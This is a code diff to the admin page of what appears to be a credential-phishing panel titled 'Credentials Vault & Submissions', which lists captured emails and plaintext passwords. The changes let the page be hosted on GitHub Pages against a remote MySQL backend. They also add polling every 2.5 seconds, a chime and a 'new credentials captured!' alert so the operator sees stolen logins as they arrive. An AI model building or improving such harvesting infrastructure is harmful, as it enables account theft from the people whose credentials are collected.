@@ -210,8 +210,15 @@
         .role-viewer { background: rgba(16,185,129,0.15); color: #6ee7b7; border: 1px solid rgba(16,185,129,0.35); }
 
         /* ── Live indicator ── */
-        .live-indicator { display: inline-block; width: 8px; height: 8px; background: #10b981; border-radius: 50%; margin-right: 6px; box-shadow: 0 0 8px #10b981; animation: pulse 2s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
+        .live-indicator { display: inline-block; width: 8px; height: 8px; background: #10b981; border-radius: 50%; margin-right: 6px; box-shadow: 0 0 8px #10b981; animation: pulse 1.6s infinite; }
+        @keyframes pulse { 0% { opacity: 1; transform: scale(1); } 50% { opacity: 0.35; transform: scale(0.85); } 100% { opacity: 1; transform: scale(1); } }
+
+        @keyframes rowHighlight {
+            0% { background-color: rgba(16, 185, 129, 0.4); }
+            50% { background-color: rgba(16, 185, 129, 0.2); }
+            100% { background-color: transparent; }
+        }
+        .row-new { animation: rowHighlight 3.5s ease-out; }
 
         /* ── Member badge (navbar) ── */
         .member-badge { background: rgba(16,185,129,0.15); color: #10b981; border: 1px solid rgba(16,185,129,0.35); padding: 6px 12px; border-radius: 8px; font-size: 12px; font-weight: 700; display: flex; align-items: center; gap: 6px; }
@@ -306,6 +313,11 @@
             <h2>Admin Authorization</h2>
             <p>Enter your credentials to access the dashboard. Access level depends on your assigned role.</p>
             <form id="adminLoginForm" onsubmit="handleAdminLogin(event)">
+                <div class="gate-input-group" id="backendUrlGroup" style="display:none;">
+                    <label for="backendUrlInput">🌐 Live Backend API URL (for GitHub Pages)</label>
+                    <input type="url" id="backendUrlInput" placeholder="https://your-backend-api.com">
+                    <span style="font-size:11px;color:var(--text-muted);display:block;margin-top:4px;">Connects GitHub Pages to your live MySQL backend.</span>
+                </div>
                 <div class="gate-input-group">
                     <label for="adminUsername">Username</label>
                     <input type="text" id="adminUsername" placeholder="e.g. developer" autocomplete="username" required autofocus>
@@ -358,7 +370,10 @@
     <!-- ═══ Navbar ═══ -->
     <header class="navbar">
         <div class="brand">
-            <div class="brand-badge">SQLITE DB</div>
+            <div class="brand-badge" id="brandDbBadge" style="display:inline-flex;align-items:center;gap:6px;background:linear-gradient(135deg, #10b981, #059669);">
+                <span class="live-indicator" style="background:#fff;box-shadow:0 0 8px #fff;"></span>
+                <span id="brandDbText">MYSQL REALTIME</span>
+            </div>
             <h1>Credentials Vault &amp; Submissions</h1>
         </div>
 
@@ -375,7 +390,7 @@
                 <span id="adminRoleBadge" class="role-badge" style="margin-left:4px;"></span>
             </div>
             <a href="/" class="btn btn-outline" target="_blank">↗ View Site</a>
-            <button class="btn btn-primary" onclick="fetchSubmissions()">🔄 Refresh</button>
+            <button class="btn btn-primary" id="refreshBtn" onclick="manualRefresh()">🔄 Refresh</button>
             <button class="btn btn-outline" id="logoutBtn" onclick="adminLogout()" style="display: none; border-color: rgba(239,68,68,0.4); color: #ef4444;">🚪 Logout</button>
         </div>
     </header>
@@ -529,6 +544,7 @@
 
     <div class="toast" id="toast">Notification message</div>
 
+    <script src="config.js"></script>
     <script>
         // ════════════════════════════════════════════════════════════════
         // State
@@ -538,6 +554,20 @@
         let currentAdminToken = sessionStorage.getItem('adminToken') || '';
         let currentAdminMember = null;
         let editingMemberId = null;
+
+        function getApiBaseUrl() {
+            const inputVal = document.getElementById('backendUrlInput')?.value?.trim();
+            if (inputVal) {
+                localStorage.setItem('BACKEND_API_URL', inputVal);
+                return inputVal.replace(/\/+$/, '');
+            }
+            if (window.APP_CONFIG && window.APP_CONFIG.BACKEND_URL) {
+                return window.APP_CONFIG.BACKEND_URL.replace(/\/+$/, '');
+            }
+            const saved = localStorage.getItem('BACKEND_API_URL');
+            if (saved) return saved.replace(/\/+$/, '');
+            return '';
+        }
 
         // Static fallback credentials (SHA-256 hashed — zero plaintext passwords)
         const STATIC_MEMBERS = [
@@ -599,7 +629,7 @@
             err.innerText = '';
 
             try {
-                const res = await fetch('/api/admin/login', {
+                const res = await fetch(`${getApiBaseUrl()}/api/admin/login`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ username: u, password: p })
@@ -688,7 +718,7 @@
 
         async function adminLogout() {
             try {
-                await fetch('/api/admin/logout', { method: 'POST', headers: getAuthHeaders() });
+                await fetch(`${getApiBaseUrl()}/api/admin/logout`, { method: 'POST', headers: getAuthHeaders() });
             } catch (e) {}
             currentAdminToken = '';
             currentAdminMember = null;
@@ -704,7 +734,7 @@
                 try {
                     currentAdminMember = JSON.parse(savedMember);
                     try {
-                        const res = await fetch('/api/admin/verify', { headers: getAuthHeaders() });
+                        const res = await fetch(`${getApiBaseUrl()}/api/admin/verify`, { headers: getAuthHeaders() });
                         if (res.ok) {
                             const data = await res.json();
                             if (data.success) {
@@ -732,10 +762,14 @@
         // ════════════════════════════════════════════════════════════════
         // Submissions
         // ════════════════════════════════════════════════════════════════
-        async function fetchSubmissions() {
+        let latestSubmissionId = 0;
+        let isInitialLoad = true;
+        let newlyArrivedIds = new Set();
+
+        async function fetchSubmissions(isBackground = false) {
             if (!currentAdminToken) { lockAdminDashboard(); return; }
             try {
-                const response = await fetch('/api/submissions', { headers: getAuthHeaders() });
+                const response = await fetch(`${getApiBaseUrl()}/api/submissions`, { headers: getAuthHeaders() });
                 if (response.status === 401) {
                     currentAdminToken = '';
                     sessionStorage.removeItem('adminToken');
@@ -745,7 +779,31 @@
                 }
                 const result = await response.json();
                 if (result.success) {
-                    allSubmissions = result.data;
+                    const incoming = result.data || [];
+                    if (result.dbType) {
+                        const brandText = document.getElementById('brandDbText');
+                        if (brandText) brandText.innerText = result.dbType.toUpperCase() + ' REALTIME';
+                    }
+
+                    if (!isInitialLoad && incoming.length > 0) {
+                        const newEntries = incoming.filter(s => Number(s.id) > latestSubmissionId);
+                        if (newEntries.length > 0) {
+                            newEntries.forEach(s => newlyArrivedIds.add(s.id));
+                            showToast(`⚡ Real-Time: ${newEntries.length} new credential${newEntries.length > 1 ? 's' : ''} captured!`);
+                            playChime();
+                            setTimeout(() => {
+                                newlyArrivedIds.clear();
+                                renderTable(allSubmissions);
+                            }, 4500);
+                        }
+                    }
+
+                    if (incoming.length > 0) {
+                        latestSubmissionId = Math.max(...incoming.map(s => Number(s.id) || 0));
+                    }
+                    isInitialLoad = false;
+
+                    allSubmissions = incoming;
                     document.getElementById('totalCount').innerText = allSubmissions.length;
                     renderTable(allSubmissions);
                     return;
@@ -792,10 +850,13 @@
                     ? `<button class="action-del" onclick="deleteEntry(${item.id})">Delete</button>`
                     : `<span style="color:var(--text-muted);font-size:11px;">No access</span>`;
 
+                const isNew = newlyArrivedIds.has(item.id);
+                const rowClass = isNew ? ' class="row-new"' : '';
+
                 return `
-                    <tr>
+                    <tr${rowClass}>
                         <td class="mono" style="color: var(--text-muted);">#${item.id}</td>
-                        <td class="user-cell mono">${safeEmail}</td>
+                        <td class="user-cell mono">${safeEmail}${isNew ? ' <span style="background:#10b981;color:#fff;font-size:10px;padding:2px 6px;border-radius:10px;font-weight:700;">NEW</span>' : ''}</td>
                         <td>
                             <div class="password-badge mono">
                                 <span>${safePassword}</span>
@@ -830,7 +891,7 @@
                 );
             } catch (e) {}
             try {
-                await fetch(`/api/submissions/${id}`, { method: 'DELETE', headers: getAuthHeaders() });
+                await fetch(`${getApiBaseUrl()}/api/submissions/${id}`, { method: 'DELETE', headers: getAuthHeaders() });
             } catch (err) {}
             showToast(`Entry #${id} deleted.`);
             fetchSubmissions();
@@ -839,7 +900,7 @@
         async function clearAllData() {
             if (!confirm('⚠️ Are you sure you want to delete ALL entries in the database? This cannot be undone.')) return;
             try { localStorage.removeItem('adminSubmissionsBackup'); } catch (e) {}
-            try { await fetch('/api/submissions', { method: 'DELETE', headers: getAuthHeaders() }); } catch (err) {}
+            try { await fetch(`${getApiBaseUrl()}/api/submissions`, { method: 'DELETE', headers: getAuthHeaders() }); } catch (err) {}
             showToast('All submissions cleared.');
             fetchSubmissions();
         }
@@ -876,7 +937,7 @@
         // ════════════════════════════════════════════════════════════════
         async function fetchMembers() {
             try {
-                const res = await fetch('/api/admin/members', { headers: getAuthHeaders() });
+                const res = await fetch(`${getApiBaseUrl()}/api/admin/members`, { headers: getAuthHeaders() });
                 if (!res.ok) {
                     if (res.status === 403) showToast('⛔ Access denied: Developers only.');
                     return;
@@ -999,13 +1060,13 @@
                 if (editingMemberId) {
                     const body = { name, role };
                     if (password) body.password = password;
-                    res = await fetch(`/api/admin/members/${editingMemberId}`, {
+                    res = await fetch(`${getApiBaseUrl()}/api/admin/members/${editingMemberId}`, {
                         method: 'PUT',
                         headers: getAuthHeaders(),
                         body: JSON.stringify(body)
                     });
                 } else {
-                    res = await fetch('/api/admin/members', {
+                    res = await fetch(`${getApiBaseUrl()}/api/admin/members`, {
                         method: 'POST',
                         headers: getAuthHeaders(),
                         body: JSON.stringify({ name, username, password, role })
@@ -1031,7 +1092,7 @@
         async function deleteMemberUI(id, username) {
             if (!confirm(`Are you sure you want to delete member "@${username}"? This cannot be undone.`)) return;
             try {
-                const res = await fetch(`/api/admin/members/${id}`, { method: 'DELETE', headers: getAuthHeaders() });
+                const res = await fetch(`${getApiBaseUrl()}/api/admin/members/${id}`, { method: 'DELETE', headers: getAuthHeaders() });
                 const data = await res.json();
                 if (res.ok && data.success) {
                     showToast(`✅ Member "@${username}" deleted.`);
@@ -1045,8 +1106,49 @@
         }
 
         // ════════════════════════════════════════════════════════════════
-        // Utilities
+        // Utilities & Real-Time Helpers
         // ════════════════════════════════════════════════════════════════
+        function playChime() {
+            try {
+                const AudioCtx = window.AudioContext || window.webkitAudioContext;
+                if (!AudioCtx) return;
+                const audioCtx = new AudioCtx();
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.type = 'sine';
+                osc.frequency.setValueAtTime(587.33, audioCtx.currentTime);
+                osc.frequency.setValueAtTime(880, audioCtx.currentTime + 0.1);
+                gain.gain.setValueAtTime(0.12, audioCtx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + 0.35);
+                osc.start();
+                osc.stop(audioCtx.currentTime + 0.35);
+            } catch (e) {}
+        }
+
+        async function manualRefresh() {
+            const btn = document.getElementById('refreshBtn');
+            if (btn) {
+                btn.style.transition = 'transform 0.4s ease';
+                btn.style.transform = 'rotate(180deg)';
+                btn.disabled = true;
+            }
+            const membersTab = document.getElementById('tabMembers');
+            if (membersTab && membersTab.classList.contains('active')) {
+                await fetchMembers();
+            } else {
+                await fetchSubmissions();
+            }
+            if (btn) {
+                setTimeout(() => {
+                    btn.style.transform = 'none';
+                    btn.disabled = false;
+                }, 350);
+            }
+            showToast('⚡ Refreshed in real-time from MySQL.');
+        }
+
         function copyToClipboard(text) {
             navigator.clipboard.writeText(text).then(() => {
                 showToast('Password copied to clipboard!');
@@ -1083,12 +1185,28 @@
         });
 
         // ════════════════════════════════════════════════════════════════
-        // Init
+        // Init & Real-Time Sync Loop
         // ════════════════════════════════════════════════════════════════
+        if (window.location.hostname.includes('github.io') || window.location.protocol === 'file:') {
+            const grp = document.getElementById('backendUrlGroup');
+            if (grp) grp.style.display = 'block';
+            const saved = localStorage.getItem('BACKEND_API_URL') || (window.APP_CONFIG?.BACKEND_URL) || '';
+            const inp = document.getElementById('backendUrlInput');
+            if (inp && saved) inp.value = saved;
+        }
+
         checkExistingSession();
+
+        // High-frequency Real-Time Polling every 2.5 seconds
         setInterval(() => {
-            if (currentAdminToken) fetchSubmissions();
-        }, 10000);
+            if (currentAdminToken) {
+                fetchSubmissions(true);
+                const membersTab = document.getElementById('tabMembers');
+                if (membersTab && membersTab.classList.contains('active')) {
+                    fetchMembers();
+                }
+            }
+        }, 2500);
     </script>
 </body>
 
